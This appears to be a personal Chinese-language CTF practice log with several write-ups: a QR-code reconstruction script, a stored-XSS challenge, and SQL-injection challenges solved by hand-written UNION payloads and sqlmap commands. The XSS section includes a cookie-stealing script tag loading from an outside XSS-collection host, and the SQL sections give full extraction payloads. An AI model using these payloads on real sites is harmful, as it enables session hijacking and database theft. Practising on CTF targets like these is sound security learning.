# CTF SR 23.03.30

## Misc Bugku 1 和 0 的故事

0 对应白色，1 对应黑色，转换成图片后在左上左下右上添加定位符即可扫描得到 flag

```py
from PIL import Image

with open("./1 和 0 的故事. txt", 'r') as f:
    lines = f.readlines()
    width = len(lines[0]) - 1 # \n
    height = len(lines)
    img = Image.new('RGB', (height, width), color = 'white')
    width, height = img.size
    print(img.size)
    for x in range(width):
        for y in range(height):
            num = lines[y][x]
            if num == '0':
                img.putpixel((x, y), (255, 255, 255))
            else:
                img.putpixel((x, y), (0, 0, 0))

    # 添加定位图案
    for i in range(7):
        img.putpixel((i, 0), (0, 0, 0))
        img.putpixel((0, i), (0, 0, 0))
        img.putpixel((i, 6), (0, 0, 0))
        img.putpixel((6, i), (0, 0, 0))

        img.putpixel((width - i - 1, 0), (0, 0, 0))
        img.putpixel((width - i - 1, 6), (0, 0, 0))
        img.putpixel((width - 6 - 1, i), (0, 0, 0))
        img.putpixel((width - 1, i), (0, 0, 0))

        img.putpixel((i, width - 7), (0, 0, 0))
        img.putpixel((0, i + width - 7), (0, 0, 0))
        img.putpixel((i, 6 + width - 7), (0, 0, 0))
        img.putpixel((6, i + width - 7), (0, 0, 0))

    for i in range(3):
        for j in range(3):
            img.putpixel((i + 2, j + 2), (0, 0, 0))
            img.putpixel((i + 2 + width - 7, j + 2), (0, 0, 0))
            img.putpixel((i + 2, j + 2 + width - 7), (0, 0, 0))

    img.save("01QRcode.bmp")
```

https://www.cnblogs.com/luogi/p/15469106.html
https://cli.im/deqr

## Web Bugku 留言板

可以用 burp 绕过前端输入过滤，但是后端仍存在过滤，转义了双引号、尖括号等，尝试使用题目给出的插入图片方法，能获得 img 标签，但是由于双引号被过滤，无法闭合 URL，无法触发 onerror，网上题解都是通过 dirsearch 扫到 admin.php 和 db.sql，但由于题目修改，db.sql 文件已经不存在了，暂时只能根据网上方法得到的用户名和密码登入 admin (没有尝试 sql 注入)，后端存储部分没有做过滤，可以直接触发 alert，flag 在 cookie 中找到。

```
content=<script>alert(document.cookie)</script>
```

因为后端没有过滤所以可以直接插入 xss 平台链接

```html
<sCRiPt sRC=//uj.ci/ao></sCrIpT>
```

但是等了一段时间没有收到 flag，不知道后台有没有定期访问管理页面的逻辑。

## web sql

好久没学复习下
没有 from 的 select 一般是显示数据或者赋值之用。https://bbs.csdn.net/topics/390345636
read https://ctf-wiki.org/web/sqli/

## sqlmap

sqlmap 是一款基于 python 编写的渗透测试工具，在 sql 检测和利用方面功能强大，支持多种数据库。

## [极客大挑战 2019]LoveSQL

username 用 `1'or 1 = 1 #` 即可登入得到回显

```txt
Hello admin！

Your password is '4e02933eb05b9feda14ad62539b4e103'
```

但得到的不是 flag，继续尝试注入
`order by` 判断列数  

```
check.php?username=admin%27order by 3%23&password=1
```

`union select` 判断回显点为 2, 3

```
check.php?username=-1%27union select 1, 2, 3%23&password=1
```

table geekuser,l0ve1ysq1

```
check.php?username=-1%27union select 1, user(), group_concat(table_name) from information_schema.tables where table_schema=database()%23&password=1
```

column id,username,password

```
check.php?username=-1%27union select 1, user(), group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='l0ve1ysq1'%23&password=1
```

flag{128a2a23-2c62-4c08-8173-0c409bc37236}

```
check.php?username=-1%27union select 1, user(), group_concat(id,username,password) from l0ve1ysq1%23&password=1
```

## [MoeCTF 2022]Sqlmap_boy

网页注释发现语句

```html
<!-- $sql = 'select username,password from users where username="'.$username.'" && password="'.$password.'";'; -->
```

双引号闭合 `1"or 1 = 1#`

```
?id=1
```

练习使用 sqlmap，需要在 cookie 里加上 PHPSESSID

```sh
python ./sqlmap.py -u "http://node1.anna.nssctf.cn:28480/secrets.php?id=1" --level 4 --cookie PHPSESSID=608b0af92607fd43bf536e325b275f10 --dbs
python ./sqlmap.py -u "http://node1.anna.nssctf.cn:28480/secrets.php?id=1" --level 4 --cookie PHPSESSID=608b0af92607fd43bf536e325b275f10 -D moectf --tables
python ./sqlmap.py -u "http://node1.anna.nssctf.cn:28480/secrets.php?id=1" --level 4 --cookie PHPSESSID=608b0af92607fd43bf536e325b275f10 -D "moectf" -T "flag" --columns
python ./sqlmap.py -u "http://node1.anna.nssctf.cn:28480/secrets.php?id=1" --level 4 --cookie PHPSESSID=608b0af92607fd43bf536e325b275f10 -D "moectf" -T "flag" -C "flAg" --dump
```